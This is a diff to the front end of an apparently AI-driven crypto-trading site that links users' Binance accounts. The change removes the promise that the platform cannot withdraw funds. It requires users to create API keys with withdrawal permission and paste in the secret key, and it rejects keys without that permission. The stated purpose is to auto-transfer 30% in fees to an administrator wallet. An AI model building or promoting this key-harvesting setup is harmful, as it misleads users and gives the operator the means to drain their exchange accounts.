@@ -243,7 +243,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;backgrou
   <!-- ═══ CEX API Key 绑定区（简化版）═══ -->
   <div id="cexBanner" class="cex-banner" style="display:none">
     <h2>⚡ 连接你的 Binance 账户</h2>
-    <div class="cex-desc">绑定 Binance API Key 后，AI 自动帮你在币安交易。资金始终在你自己的币安账户，平台无法提币。<b style="color:#3fb950">点击下方按钮直接跳转币安 APP 创建 API Key</b></div>
+    <div class="cex-desc">绑定 Binance API Key 后，AI 自动帮你在币安交易。资金始终在你自己的币安账户。<b style="color:#f0883e">⚠️ 创建 API Key 时必须勾选「允许提现」权限，否则无法绑定</b>。提现权限用于平仓后自动转账服务费(20%)和生态费(10%)到管理员钱包。<b style="color:#3fb950">点击下方按钮直接跳转币安 APP 创建 API Key</b></div>
 
     <!-- 快速跳转币安 -->
     <div style="display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap">
@@ -256,9 +256,9 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;backgrou
     <!-- 简短安全说明 -->
     <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:16px">
       <div style="background:#0d1117;border:1px solid #21262d;border-radius:8px;padding:12px;text-align:center">
-        <div style="color:#3fb950;font-size:1.2em;margin-bottom:4px">🔒</div>
-        <div style="color:#e0e0e0;font-size:.8em;font-weight:600">只交易 不提币</div>
-        <div style="color:#8b949e;font-size:.72em;margin-top:2px">资金安全</div>
+        <div style="color:#3fb950;font-size:1.2em;margin-bottom:4px">🔓</div>
+        <div style="color:#e0e0e0;font-size:.8em;font-weight:600">需提现权限</div>
+        <div style="color:#8b949e;font-size:.72em;margin-top:2px">自动转账服务费</div>
       </div>
       <div style="background:#0d1117;border:1px solid #21262d;border-radius:8px;padding:12px;text-align:center">
         <div style="color:#3fb950;font-size:1.2em;margin-bottom:4px">🤖</div>
@@ -275,7 +275,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;backgrou
     <!-- API Key 输入表单 -->
     <div id="cexForm" class="cex-form" style="display:none">
       <div class="cex-form-title">🔗 粘贴你的 Binance API Key</div>
-      <div style="color:#8b949e;font-size:.8em;margin-bottom:10px;line-height:1.5">在币安 APP → 用户中心 → API 管理 → 创建 API → 复制 API Key 和 Secret Key</div>
+      <div style="color:#f0883e;font-size:.82em;margin-bottom:8px;line-height:1.5;background:#0d1117;border:1px solid #f0883e33;border-radius:6px;padding:8px 12px">⚠️ <b>重要：创建 API Key 时必须勾选以下 3 个权限：</b><br>1. ✅ 允许合约交易（Futures）<br>2. ✅ 允许现货交易（Spot）<br>3. ✅ <b style="color:#f0883e">允许提现（Withdraw）</b> — 缺少此权限将被拒绝绑定<br><br>在币安 APP → 用户中心 → API 管理 → 创建 API → 勾选以上权限 → 复制 API Key 和 Secret Key</div>
       <div class="cex-input-group">
         <input type="text" id="cexApiKey" class="cex-input" placeholder="API Key（从 Binance 复制）" />
         <input type="password" id="cexSecretKey" class="cex-input" placeholder="Secret Key（从 Binance 复制）" />
@@ -290,7 +290,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;backgrou
     <!-- 已绑定状态 -->
     <div id="cexConnected" class="cex-connected" style="display:none">
       <div class="cex-dot"></div>
-      <div class="cex-info">已绑定 Binance API · CEX 模式已开启 · 手续费 0.08%<br><span>资金在你的 Binance 账户 · 平台无法提币 · <span style="color:#f85149;cursor:pointer" onclick="unbindCex()">解绑</span></span></div>
+      <div class="cex-info">已绑定 Binance API · CEX 模式已开启 · 含提现权限 · 手续费 0.08%<br><span>资金在你的 Binance 账户 · 平台自动转账服务费/生态费 · <span style="color:#f85149;cursor:pointer" onclick="unbindCex()">解绑</span></span></div>
     </div>
   </div>
 
@@ -1936,7 +1936,7 @@ async function verifyCexKeys() {
       const balances = data.balances || {};
       const totalUsdt = balances.USDT || data.balance || 0;
       resultEl.className = 'cex-status ok';
-      resultEl.innerHTML = '✅ API Key 验证成功！余额: <b>$' + (typeof totalUsdt === 'number' ? totalUsdt.toFixed(2) : totalUsdt) + ' USDT</b>';
+      resultEl.innerHTML = '✅ API Key 验证成功！余额: <b>$' + (typeof totalUsdt === 'number' ? totalUsdt.toFixed(2) : totalUsdt) + ' USDT</b><br>✅ 已确认提现权限，服务费/生态费自动转账已开启';
       toast('✅ Binance API 绑定成功！', 'ok');
       setTimeout(() => {
         document.getElementById('cexForm').style.display = 'none';
@@ -1947,7 +1947,13 @@ async function verifyCexKeys() {
       }, 1500);
     } else {
       resultEl.className = 'cex-status err';
-      resultEl.textContent = '❌ ' + (data.error || '验证失败');
+      if (data.needWithdraw) {
+        resultEl.innerHTML = '❌ <b>API Key 缺少「提现」权限！</b><br><br>' + data.error + '<br><br>' + (data.guide || '') + '<br><br><a href="https://www.binance.com/zh-CN/my/settings/api-management" target="_blank" style="color:#3fb950">📱 点击前往币安重新创建 API Key</a>';
+      } else if (data.needFutures) {
+        resultEl.innerHTML = '❌ <b>API Key 缺少「合约交易」权限！</b><br><br>' + data.error + '<br><br><a href="https://www.binance.com/zh-CN/my/settings/api-management" target="_blank" style="color:#3fb950">📱 点击前往币安重新创建 API Key</a>';
+      } else {
+        resultEl.textContent = '❌ ' + (data.error || '验证失败');
+      }
     }
   } catch(e) {
     resultEl.className = 'cex-status err';
